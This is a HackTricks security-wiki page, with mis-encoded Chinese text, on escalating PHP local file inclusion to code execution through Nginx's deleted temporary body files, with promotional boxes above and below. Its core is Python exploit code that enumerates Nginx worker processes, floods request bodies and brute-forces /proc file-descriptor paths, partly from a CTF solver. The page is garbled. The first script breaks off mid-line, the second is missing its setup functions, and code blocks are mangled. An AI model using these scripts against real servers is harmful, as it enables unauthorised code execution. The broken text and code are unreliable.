# é€šè¿‡Nginxä¸´æ—¶æ–‡ä»¶è¿›è¡ŒLFI2RCE

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ¨åŠ¨çš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**ä¾µå®³**ã€‚

WhiteIntelçš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±ä¿¡æ¯çªƒå–æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

***

## å¯åˆ©ç”¨çš„é…ç½®

[**æ¥è‡ªhttps://bierbaumer.net/security/php-lfi-with-nginx-assistance/**çš„ç¤ºä¾‹](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

* PHPä»£ç :

\`\`\`\`h\`

/dev/pts/0 lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -> /dev/pts/0 lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -> anon\_inode:\[eventfd] lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -> socket:\[27587] lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -> socket:\[27589] lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -> socket:\[44926] lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -> socket:\[44927] lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -> /var/lib/nginx/body/0000001368 (deleted) ... \`\`\` æ³¨æ„ï¼šåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œä¸èƒ½ç›´æ¥åŒ…å«\`/proc/34/fd/15\`ï¼Œå› ä¸ºPHPçš„\`include\`å‡½æ•°ä¼šå°†è·¯å¾„è§£æä¸º\`/var/lib/nginx/body/0000001368 (deleted)\`ï¼Œè€Œè¯¥è·¯å¾„åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¸å­˜åœ¨ã€‚å¹¸è¿çš„æ˜¯ï¼Œå¯ä»¥é€šè¿‡ä¸€äº›é—´æ¥æ–¹å¼ç»•è¿‡è¿™ä¸ªå°é™åˆ¶ï¼Œæ¯”å¦‚ï¼š\`/proc/self/fd/34/../../../34/fd/15\`ï¼Œæœ€ç»ˆå°†æ‰§è¡Œå·²åˆ é™¤çš„\`/var/lib/nginx/body/0000001368\`æ–‡ä»¶çš„å†…å®¹ã€‚ ## å®Œæ•´åˆ©ç”¨ \`\`\`python #!/usr/bin/env python3 import sys, threading, requests # åˆ©ç”¨nginxçš„å®¢æˆ·ç«¯ä¸»ä½“ç¼“å†²è¾…åŠ©è¿›è¡ŒPHPæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ # è¯¦ç»†ä¿¡æ¯è¯·å‚é˜…https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ URL = f'http://{sys.argv\[1\]}:{sys.argv\[2\]}/' # æŸ¥æ‰¾nginxå·¥ä½œè¿›ç¨‹ r = requests.get(URL, params={ 'file': '/proc/cpuinfo' }) cpus = r.text.count('processor') r = requests.get(URL, params={ 'file': '/proc/sys/kernel/pid\_max' }) pid\_max = int(r.text) print(f'\[\*] cpus: {cpus}; pid\_max: {pid\_max}') nginx\_workers = \[] for pid in range(pid\_max): r = requests.get(URL, params={ 'file': f'/proc/{pid}/cmdline' }) if b'nginx: worker process' in r.content: print(f'\[\*] nginx worker found: {pid}') nginx\_workers.append(pid) if len(nginx\_workers) >= cpus: break done = False # ä¸Šä¼ ä¸€ä¸ªå¤§çš„å®¢æˆ·ç«¯ä¸»ä½“ä»¥å¼ºåˆ¶nginxåˆ›å»ºä¸€ä¸ª/var/lib/nginx/body/$X def uploader(): print('\[+] starting uploader') while not done: requests.get(URL, data=' //'
```
requests_session.post(SERVER + "/?action=read&file=/bla", data=(payload + ("a" * (body_size - len(payload)))))
except:
pass
```
```python
def send_payload_worker(requests_session): while True: send_payload(requests_session)

def send_payload_multiprocess(requests_session): # ä½¿ç”¨æ‰€æœ‰ CPU å°† payload ä½œä¸ºè¯·æ±‚ä½“å‘é€ç»™ Nginx for _ in range(multiprocessing.cpu_count()): p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,)) p.start()

def generate_random_path_prefix(nginx_pids): # æ­¤æ–¹æ³•ä»éšæœºæ•°é‡çš„ ProcFS è·¯å¾„ç»„ä»¶åˆ›å»ºè·¯å¾„ã€‚ç”Ÿæˆçš„è·¯å¾„å°†ç±»ä¼¼äº /proc/<nginx pid 1>/cwd/proc/<nginx pid 2>/root/proc/<nginx pid 3>/root path = "" component_num = random.randint(0, 10) for _ in range(component_num): pid = random.choice(nginx_pids) if random.randint(0, 1) == 0: path += f"/proc/{pid}/cwd" else: path += f"/proc/{pid}/root" return path

def read_file(requests_session, nginx_pid, fd, nginx_pids): nginx_pid_list = list(nginx_pids) while True: path = generate_random_path_prefix(nginx_pid_list) path += f"/proc/{nginx_pid}/fd/{fd}" try: d = requests_session.get(SERVER + f"/?action=include&file={path}").text except: continue # Flags are formatted as hxp{} if "hxp" in d: print("Found flag! ") print(d)

def read_file_worker(requests_session, nginx_pid, nginx_pids): # åœ¨å¾ªç¯ä¸­æ‰«æ 10 åˆ° 45 ä¹‹é—´çš„ Nginx FDã€‚ç”±äºæ–‡ä»¶å’Œå¥—æ¥å­—ä¿æŒå…³é—­ - è¯·æ±‚ä½“ FD å¾ˆå¸¸è§åœ¨æ­¤èŒƒå›´å†…æ‰“å¼€ for fd in range(10, 45): thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids)) thread.start()

def read_file_multiprocess(requests_session, nginx_pids): for nginx_pid in nginx_pids: p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids)) p.start()

if __name__ == "main": print('[DEBUG] åˆ›å»ºè¯·æ±‚ä¼šè¯') requests_session = create_requests_session() print('[DEBUG] è·å– Nginx pid') nginx_pids = get_nginx_pids(requests_session) print(f'[DEBUG] Nginx pid: {nginx_pids}') print('[DEBUG] å¼€å§‹å‘é€ payload') send_payload_multiprocess(requests_session) print('[DEBUG] å¼€å§‹ fd è¯»å–å™¨') read_file_multiprocess(requests_session, nginx_pids)
```
```

## Labs

* [https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz)
* [https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/)
* [https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/](https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/)

## References

* [https://bierbaumer.net/security/php-lfi-with-nginx-assistance/](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) is a **dark-web** fueled search engine that offers **free** functionalities to check if a company or its customers have been **compromised** by **stealer malwares**.

Their primary goal of WhiteIntel is to combat account takeovers and ransomware attacks resulting from information-stealing malware.

You can check their website and try their engine for **free** at:

<div data-gb-custom-block data-tag="embed" data-url='https://whiteintel.io'></div>

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
```

